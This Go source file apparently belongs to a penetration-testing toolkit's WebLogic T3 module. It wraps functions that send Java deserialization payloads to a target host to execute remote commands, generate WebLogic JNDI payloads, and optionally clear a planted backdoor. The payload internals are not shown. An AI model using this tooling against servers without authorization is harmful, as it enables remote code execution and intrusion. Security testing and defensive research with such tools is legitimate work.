package t3

import (
	"yaklang/common/log"
	"yaklang/common/utils"
)

func _execT3(addr string, cmd string, f ...OptionFun) (string, error) {
	f = append(f, SetAddr(addr))
	var payload = NewT3Payload(f...)
	var result, err = payload.Exec(cmd)
	if err != nil {
		return "", utils.Errorf("paylaod exec failed: %s", err)
	}
	return result, nil
}

func SendSreamBytes(addr string, acedBytes interface{}, f ...OptionFun) error {
	f = append(f, SetAddr(addr))
	var payload = NewT3Payload(f...)
	return payload.SendPayload(utils.InterfaceToBytes(acedBytes))
}

func SetAddr(addr string) OptionFun {
	return func(t *T3Paylaod) {
		host, port, err := utils.ParseStringToHostPort(addr)
		if err != nil {
			log.Errorf("parse [%s] failed: %s", addr, err)
			return
		}
		t.Ip, t.Port = host, port
	}

}
func SetTimeout(duration float64) OptionFun {
	return func(t *T3Paylaod) {
		t.timeout = utils.FloatSecondDuration(duration)
	}
}

func SetClearBackdoor(clear bool) OptionFun {
	return func(paylaod *T3Paylaod) {
		paylaod.clearBackdoor = clear
	}
}

func SetDebugHandler(handler func(string)) OptionFun {
	return func(paylaod *T3Paylaod) {
		paylaod.handler = handler
	}
}

var GenExecPayload = genPayload
var Exports = map[string]interface{}{
	"ExecCommand":                   _execT3,
	"SendJavaObjectStreamBytes":     SendSreamBytes,
	"GenerateJavaObjectStreamBytes": GenExecPayload,
	"GenerateWeblogicJNDIPayload":   GenerateWeblogicJNDIPayload,
	"timeout":                       SetTimeout,
	"clearBackdoor":                 SetClearBackdoor,
	"debugHandler":                  SetDebugHandler,
}
